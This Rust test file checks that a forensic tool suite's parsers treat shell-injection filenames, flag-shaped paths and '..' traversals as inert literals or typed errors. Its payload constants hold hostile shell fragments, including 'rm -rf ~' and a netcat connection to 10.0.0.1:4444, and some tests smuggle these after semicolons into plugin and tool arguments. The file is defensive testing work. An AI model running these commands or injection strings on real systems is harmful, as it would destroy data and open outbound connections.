//! Adversarial path-handling tests — the Constraint-Implementation guardrail
//! "no `execute_shell`, typed paths only", exercised at the path boundary.
//!
//! Threat model. Every DFIR tool here is read-only and takes a typed `PathBuf`.
//! None of them build a shell command line: there is no `sh -c` anywhere in the
//! tool surface, and the subprocess tools (Volatility / Hayabusa / tshark / mount)
//! invoke `Command::new(bin).args([...])` with a FIXED argv, so a path is always a
//! single argv element, never re-parsed as a flag or a shell fragment (the
//! `vel_collect` arg-name/artifact-name tests cover that injection boundary). That
//! means there is no execution sink for a malicious path to reach.
//!
//! These tests pin that contract: a path crafted to look like a shell-injection
//! payload, a flag, or a `..` traversal is treated as an ORDINARY filesystem path
//! — the tool either reads exactly that literal file (`case_open`) or returns its
//! typed `NotFound` error (the parsers). No panic, no execution, no flag parsing.
//!
//! Note on traversal: there is deliberately NO path jail. Evidence legitimately
//! lives at arbitrary analyst-chosen absolute paths, and the tools run with the
//! analyst's own privileges, so a `..` path is not a privilege boundary to escape
//! — it simply resolves to a file that is or isn't there. We assert it resolves
//! cleanly to a typed `NotFound` rather than crashing or being interpreted.
//!
//! Rejected-and-contained contract. Every hostile input below must be both
//! REJECTED (a typed error) OR handled as an inert literal (read as bytes, no
//! re-interpretation), AND CONTAINED (no shell ran, so no payload side-effect
//! file appears). `assert_contained` pins the containment half explicitly so a
//! future regression that started shelling out would fail loudly even if the
//! typed error were preserved.
//!
//! Where the "is it logged?" assertion lives. The audit RECORD for a rejected
//! attempt — the `tool_call_output` row that proves the rejection was observed
//! and chained — is written by the CALLER, not by these Rust tool functions. In
//! the product that caller is `scripts/find_evil_auto.py`, whose `call_tool`
//! records the tool output (success OR error envelope) before the engine acts on
//! it. At the Rust unit-test level there is no audit log to inspect; the
//! assertable rejection signal is the typed error / inert handling. So these
//! tests pin the containment contract the Rust layer actually owns; the
//! "rejected attempt is logged" assertion belongs in the `find_evil_auto` /
//! server caller-layer tests, not here.
//!
//! Extract -> secondary-parser escape. `disk_extract_artifacts` stages a set of
//! carved artifacts under a run/output dir, and the secondary parsers
//! (`ez_parse`, `plaso_parse`, `mft_timeline`, ...) are then pointed at members
//! of that set. A hostile artifact path containing `..` traversal that resolves
//! OUTSIDE the staged extract set must not let a parser quietly read or act on a
//! file beyond the set: it is either a typed `NotFound` (the escaped target is
//! not in the set) or, if the escaped path happens to hit a real file, that file
//! is read as inert parser input and rejected by content (wrong magic), never
//! executed. The `*_escape_*` tests below pin both halves of that boundary.

use std::fs;
use std::path::PathBuf;
use std::sync::{Mutex, MutexGuard, OnceLock};

use findevil_mcp::{
    ausearch, case_open, evtx_query, ez_parse, indx_parse, journalctl_query, login_accounting,
    mac_triage, mft_timeline, nfdump_query, plaso_parse, prefetch_parse, suricata_eve, vol_run,
    AusearchError, AusearchInput, CaseOpenInput, EvtxError, EvtxQueryInput, EzParseError,
    EzParseInput, IndxError, IndxParseInput, JournalctlQueryError, JournalctlQueryInput,
    LoginAccountingError, LoginAccountingInput, MacTriageError, MacTriageInput, MftError, MftInput,
    NfdumpQueryError, NfdumpQueryInput, PlasoParseError, PlasoParseInput, PrefetchError,
    PrefetchInput, SuricataEveError, SuricataEveInput, VolRunError, VolRunInput,
};

// A string that would be catastrophic if any tool ever shelled out.
// If a shell ever interpreted it, `touch`/`rm`/`nc` would run; because nothing
// shells out, it is an inert sequence of bytes.
const SHELL_PAYLOAD: &str = "evil; touch HACKED && $(rm -rf ~) | nc 10.0.0.1 4444 `id`";

// The same guardrail exercised through real filesystem paths. Keep this one
// valid as a filename on Windows as well as POSIX.
const SHELL_PAYLOAD_FILENAME: &str = "evil; touch HACKED && $(rm -rf home) & whoami";

fn env_lock() -> MutexGuard<'static, ()> {
    static LOCK: OnceLock<Mutex<()>> = OnceLock::new();
    LOCK.get_or_init(|| Mutex::new(()))
        .lock()
        .unwrap_or_else(std::sync::PoisonError::into_inner)
}

#[allow(clippy::used_underscore_binding)]
struct HomeGuard {
    prev: Option<String>,
    _lock: MutexGuard<'static, ()>,
}
#[allow(clippy::used_underscore_binding)]
impl HomeGuard {
    fn set(new: &std::path::Path) -> Self {
        let _lock = env_lock();
        let prev = std::env::var("FINDEVIL_HOME").ok();
        std::env::set_var("FINDEVIL_HOME", new);
        Self { prev, _lock }
    }
}
impl Drop for HomeGuard {
    fn drop(&mut self) {
        match &self.prev {
            Some(v) => std::env::set_var("FINDEVIL_HOME", v),
            None => std::env::remove_var("FINDEVIL_HOME"),
        }
    }
}

/// The containment half of the rejected-and-contained contract: if any tool had
/// shelled out, the `SHELL_PAYLOAD*` strings would have run `touch HACKED`, so a
/// `HACKED` file would appear. Assert no such side-effect artifact exists under
/// the test's scratch root. Pinned in one place so the contract reads the same at
/// every call site and a regression fails with a clear message.
fn assert_contained(scratch: &std::path::Path) {
    assert!(
        !scratch.join("HACKED").exists(),
        "no shell executed the payload — nothing should write HACKED under {}",
        scratch.display()
    );
}

#[test]
fn case_open_reads_shell_payload_filename_as_a_literal_file() {
    // A real evidence file whose NAME is a shell-injection payload. case_open
    // must hash exactly these bytes — proving the metacharacters are an inert
    // path, not a command.
    let tmp = tempfile::tempdir().expect("tempdir");
    let _home = HomeGuard::set(tmp.path());

    let bytes = b"\x00MFT-ish evidence bytes for a hostile filename";
    let evil = tmp.path().join(format!("{SHELL_PAYLOAD_FILENAME}.e01"));
    fs::write(&evil, bytes).expect("write hostile-named evidence");

    let handle = case_open(&CaseOpenInput {
        image_path: evil,
        expected_sha256: None,
        label: Some("bypass-literal".to_string()),
    })
    .expect("case_open treats the hostile name as a normal file");

    assert_eq!(
        handle.image_size_bytes,
        bytes.len() as u64,
        "hashed exactly the literal file at that path, nothing else"
    );
    assert_eq!(handle.image_hash.len(), 64);
    // The payload's `touch HACKED` never ran: nothing shelled out, so no stray
    // file appeared next to the evidence.
    assert_contained(tmp.path());
}

#[test]
fn evtx_query_treats_shell_payload_path_as_missing_file() {
    let tmp = tempfile::tempdir().expect("tempdir");
    let missing = tmp.path().join(format!("{SHELL_PAYLOAD_FILENAME}.evtx"));

    let err = evtx_query(&EvtxQueryInput {
        case_id: "c".to_string(),
        evtx_path: missing,
        eids: None,
        xpath: None,
        limit: None,
    })
    .expect_err("a non-existent hostile path must error, not execute");

    assert!(matches!(err, EvtxError::EvtxNotFound(_)));
    assert_contained(tmp.path());
}

#[test]
fn prefetch_parse_treats_traversal_path_as_missing_file() {
    // A `..` traversal to a non-existent file resolves cleanly to NotFound — no
    // panic, no jail to escape (the tool runs as the analyst already).
    let tmp = tempfile::tempdir().expect("tempdir");
    let traversal: PathBuf = tmp
        .path()
        .join("..")
        .join("..")
        .join("..")
        .join("nonexistent-EVIL.pf");

    let err = prefetch_parse(&PrefetchInput {
        case_id: "c".to_string(),
        prefetch_path: traversal,
    })
    .expect_err("traversal to a missing file must be a clean typed error");

    assert!(matches!(err, PrefetchError::NotFound(_)));
    assert_contained(tmp.path());
}

#[test]
fn vol_run_rejects_shell_payload_plugin_before_any_subprocess() {
    // vol_run is the one parameterized verb whose argument (the plugin name)
    // reaches argv. The allow-list is its injection boundary: a plugin string
    // shaped like a shell payload is not on the list, so it is rejected with a
    // typed PluginNotAllowed BEFORE any path check or subprocess spawn — even
    // pointing at a real file. No `windows.cmdline` plugin ever runs.
    let tmp = tempfile::tempdir().expect("tempdir");
    let real = tmp.path().join("image.mem");
    fs::write(&real, b"not really a memory image").expect("write");

    let err = vol_run(&VolRunInput {
        case_id: "c".to_string(),
        memory_path: real,
        plugin: format!("windows.cmdline; {SHELL_PAYLOAD}"),
        pid: None,
        limit: None,
    })
    .expect_err("a shell-payload plugin string must be rejected, not executed");

    assert!(
        matches!(err, VolRunError::PluginNotAllowed(_)),
        "got {err:?}"
    );
    assert_contained(tmp.path());
}

#[test]
fn ez_parse_rejects_shell_payload_tool_before_any_subprocess() {
    // ez_parse's `tool` parameter selects the binary. The allow-list is the
    // injection boundary: a tool string shaped like a shell payload is not on
    // the list, so it is rejected with ToolNotAllowed BEFORE any path check or
    // subprocess — even pointing at a real file. No EZ binary ever runs.
    let tmp = tempfile::tempdir().expect("tempdir");
    let real = tmp.path().join("evil.lnk");
    fs::write(&real, b"not really a lnk").expect("write");

    let err = ez_parse(&EzParseInput {
        case_id: "c".to_string(),
        tool: format!("lecmd; {SHELL_PAYLOAD}"),
        artifact_path: real,
        limit: None,
    })
    .expect_err("a shell-payload tool string must be rejected, not executed");

    assert!(
        matches!(err, EzParseError::ToolNotAllowed(_)),
        "got {err:?}"
    );
    assert_contained(tmp.path());
}

#[test]
fn plaso_parse_rejects_shell_payload_parser_before_any_subprocess() {
    // plaso_parse's `parser` parameter reaches argv. The allow-list is the
    // injection boundary: a parser string shaped like a shell payload is not on
    // the list, so it is rejected with ParserNotAllowed BEFORE any path check or
    // subprocess — even pointing at a real file. No plaso stage ever runs.
    let tmp = tempfile::tempdir().expect("tempdir");
    let real = tmp.path().join("auth.log");
    fs::write(&real, b"Jun 13 sshd login").expect("write");

    let err = plaso_parse(&PlasoParseInput {
        case_id: "c".to_string(),
        parser: format!("syslog; {SHELL_PAYLOAD}"),
        artifact_path: real,
        limit: None,
    })
    .expect_err("a shell-payload parser string must be rejected, not executed");

    assert!(
        matches!(err, PlasoParseError::ParserNotAllowed(_)),
        "got {err:?}"
    );
    assert_contained(tmp.path());
}

#[test]
fn mac_triage_rejects_shell_payload_module_before_any_subprocess() {
    // mac_triage's `module` parameter reaches argv. The allow-list is the
    // injection boundary: a module string shaped like a shell payload is not on
    // the list, so it is rejected with ModuleNotAllowed BEFORE any path check or
    // subprocess — even pointing at a real directory. No mac_apt ever runs.
    let tmp = tempfile::tempdir().expect("tempdir");

    let err = mac_triage(&MacTriageInput {
        case_id: "c".to_string(),
        module: format!("UNIFIEDLOGS; {SHELL_PAYLOAD}"),
        image_path: tmp.path().to_path_buf(),
        limit: None,
    })
    .expect_err("a shell-payload module string must be rejected, not executed");

    assert!(
        matches!(err, MacTriageError::ModuleNotAllowed(_)),
        "got {err:?}"
    );
    assert_contained(tmp.path());
}

#[test]
fn mft_timeline_treats_flag_looking_path_as_a_literal_path() {
    // A path that looks like a CLI flag is a path, not a flag — these tools never
    // forward it to argv parsing, and a missing one is a typed NotFound.
    let tmp = tempfile::tempdir().expect("tempdir");
    let flaggy = tmp.path().join("--output=__rooted__ -rf .mft");

    let err = mft_timeline(&MftInput {
        case_id: "c".to_string(),
        mft_path: flaggy,
        since_iso: None,
        until_iso: None,
        limit: None,
    })
    .expect_err("flag-looking missing path must be a clean typed error");

    assert!(matches!(err, MftError::MftNotFound(_)));
    assert_contained(tmp.path());
}

#[test]
fn journalctl_query_treats_shell_payload_path_as_missing_file() {
    // The journal_path becomes a single `--file` argv element, never a shell
    // fragment — a hostile path to a missing file is a clean typed NotFound,
    // and journalctl is never even spawned (the existence check fails first).
    let tmp = tempfile::tempdir().expect("tempdir");
    let missing = tmp.path().join(format!("{SHELL_PAYLOAD_FILENAME}.journal"));

    let err = journalctl_query(&JournalctlQueryInput {
        case_id: "c".to_string(),
        journal_path: missing,
        since: None,
        until: None,
        limit: None,
    })
    .expect_err("a non-existent hostile path must error, not execute");

    assert!(matches!(err, JournalctlQueryError::NotFound(_)));
    assert_contained(tmp.path());
}

#[test]
fn login_accounting_treats_flag_looking_path_as_a_literal_path() {
    // A path that looks like a CLI flag is a path, not a flag — it becomes a
    // single `-f` argv element and a missing one is a clean typed NotFound.
    let tmp = tempfile::tempdir().expect("tempdir");
    let flaggy = tmp.path().join("--output=__rooted__ -rf wtmp");

    let err = login_accounting(&LoginAccountingInput {
        case_id: "c".to_string(),
        accounting_path: flaggy,
        limit: None,
    })
    .expect_err("flag-looking missing path must be a clean typed error");

    assert!(matches!(err, LoginAccountingError::NotFound(_)));
    assert_contained(tmp.path());
}

#[test]
fn ausearch_treats_traversal_path_as_missing_file() {
    // A `..` traversal to a non-existent audit.log resolves cleanly to NotFound —
    // no panic, no jail to escape, and ausearch is never spawned.
    let tmp = tempfile::tempdir().expect("tempdir");
    let traversal: PathBuf = tmp
        .path()
        .join("..")
        .join("..")
        .join("..")
        .join("nonexistent-EVIL-audit.log");

    let err = ausearch(&AusearchInput {
        case_id: "c".to_string(),
        audit_log_path: traversal,
        limit: None,
    })
    .expect_err("traversal to a missing file must be a clean typed error");

    assert!(matches!(err, AusearchError::NotFound(_)));
    assert_contained(tmp.path());
}

#[test]
fn nfdump_query_treats_shell_payload_path_as_missing_file() {
    // FIXED `-r <flow_path> -o json` argv, no free-text filter field — a hostile
    // flow_path is one inert argv element; a missing one is a typed FlowNotFound
    // (the existence check runs before any spawn, so this holds with or without
    // nfdump installed).
    let tmp = tempfile::tempdir().expect("tempdir");
    let missing = tmp.path().join(format!("{SHELL_PAYLOAD_FILENAME}.nfcapd"));

    let err = nfdump_query(&NfdumpQueryInput {
        case_id: "c".to_string(),
        flow_path: missing,
        limit: None,
    })
    .expect_err("a non-existent hostile path must error, not execute");

    assert!(matches!(err, NfdumpQueryError::FlowNotFound(_)));
    assert_contained(tmp.path());
}

#[test]
fn suricata_eve_treats_shell_payload_path_as_missing_file() {
    // FIXED `-r <pcap_path> -l <outdir>` argv — a hostile pcap_path is one inert
    // argv element; a missing one is a typed PcapNotFound before any spawn.
    let tmp = tempfile::tempdir().expect("tempdir");
    let missing = tmp.path().join(format!("{SHELL_PAYLOAD_FILENAME}.pcap"));

    let err = suricata_eve(&SuricataEveInput {
        case_id: "c".to_string(),
        pcap_path: missing,
        limit: None,
    })
    .expect_err("a non-existent hostile path must error, not execute");

    assert!(matches!(err, SuricataEveError::PcapNotFound(_)));
    assert_contained(tmp.path());
}

#[test]
fn indx_parse_treats_shell_payload_path_as_missing_file() {
    // FIXED `INDXParse.py <indx_path>` argv — a hostile indx_path is one inert
    // argv element; a missing one is a typed NotFound before any spawn.
    let tmp = tempfile::tempdir().expect("tempdir");
    let missing = tmp.path().join(format!("{SHELL_PAYLOAD_FILENAME}.indx"));

    let err = indx_parse(&IndxParseInput {
        case_id: "c".to_string(),
        indx_path: missing,
        limit: None,
    })
    .expect_err("a non-existent hostile path must error, not execute");

    assert!(matches!(err, IndxError::NotFound(_)));
    assert_contained(tmp.path());
}

// ---------------------------------------------------------------------------
// Extract -> secondary-parser path-escape boundary.
//
// `disk_extract_artifacts` stages carved artifacts under a run/output dir; the
// secondary parsers are then pointed at members of that set. These tests model
// that layout: `<root>/extracted/` is the staged set, and a sibling file lives
// OUTSIDE it. A mount-relative `..` path handed to a parser tries to escape the
// set. We assert the escape is contained — a typed error, with the outside file
// either never read (it is not in the set) or read only as inert parser input
// and rejected by content, never executed.
// ---------------------------------------------------------------------------

/// Build a staged extract layout and an escaping path. Returns
/// `(root, escaping_path)` where `escaping_path` starts inside
/// `<root>/extracted/` and walks `..` back out to `<root>/<outside_name>` —
/// outside the staged set. The `extracted` dir is created; the outside target
/// is NOT created here (callers plant it when they want the "real file" case).
fn staged_escape(outside_name: &str) -> (tempfile::TempDir, PathBuf) {
    let root = tempfile::tempdir().expect("tempdir");
    let extracted = root.path().join("extracted");
    fs::create_dir_all(&extracted).expect("stage extract dir");
    // From inside the staged set, `..` climbs back to the run root, escaping the
    // set to a sibling the extractor never placed there.
    let escaping = extracted.join("..").join(outside_name);
    (root, escaping)
}

#[test]
fn ez_parse_escape_outside_staged_extract_is_not_found() {
    // A mount-relative `..` artifact path that resolves OUTSIDE the staged
    // extract set, to a target the extractor never produced. ez_parse checks
    // existence after the allow-list, so the escaped (non-existent) target is a
    // typed ArtifactNotFound BEFORE any subprocess — the parser never reaches
    // outside the set, with or without the EZ binary installed.
    let (root, escaping) = staged_escape("outside-secret.lnk");

    let err = ez_parse(&EzParseInput {
        case_id: "c".to_string(),
        tool: "lecmd".to_string(),
        artifact_path: escaping,
        limit: None,
    })
    .expect_err("an escaping path outside the staged set must be a typed error");

    assert!(
        matches!(err, EzParseError::ArtifactNotFound(_)),
        "got {err:?}"
    );
    assert_contained(root.path());
}

#[test]
fn plaso_parse_escape_outside_staged_extract_is_not_found() {
    // Same boundary for plaso_parse: an allow-listed parser given a `..` path
    // that escapes the staged set to a non-existent sibling is a typed
    // ArtifactNotFound before log2timeline ever runs.
    let (root, escaping) = staged_escape("outside-secret.log");

    let err = plaso_parse(&PlasoParseInput {
        case_id: "c".to_string(),
        parser: "syslog".to_string(),
        artifact_path: escaping,
        limit: None,
    })
    .expect_err("an escaping path outside the staged set must be a typed error");

    assert!(
        matches!(err, PlasoParseError::ArtifactNotFound(_)),
        "got {err:?}"
    );
    assert_contained(root.path());
}

#[test]
fn mft_timeline_escape_to_real_file_outside_set_reads_inert_then_rejects() {
    // The harder half: the escaping `..` path resolves to a REAL file that lives
    // outside the staged extract set (a planted secret the extractor never carved
    // as an MFT). mft_timeline must NOT treat it as a valid artifact — it opens
    // the bytes as MFT input, finds the wrong magic, and returns a typed MftOpen.
    // The secret's content is read only as inert parser input; nothing executes
    // and no entries are produced from outside the set.
    let (root, escaping) = staged_escape("outside-secret.bin");
    // Plant the real outside file the escape points at.
    let resolved = root.path().join("outside-secret.bin");
    fs::write(
        &resolved,
        b"not an MFT - secret bytes outside the staged extract set",
    )
    .expect("plant outside secret");

    let err = mft_timeline(&MftInput {
        case_id: "c".to_string(),
        mft_path: escaping,
        since_iso: None,
        until_iso: None,
        limit: None,
    })
    .expect_err("a non-MFT file reached via escape must be rejected by content");

    assert!(matches!(err, MftError::MftOpen { .. }), "got {err:?}");
    assert_contained(root.path());
}
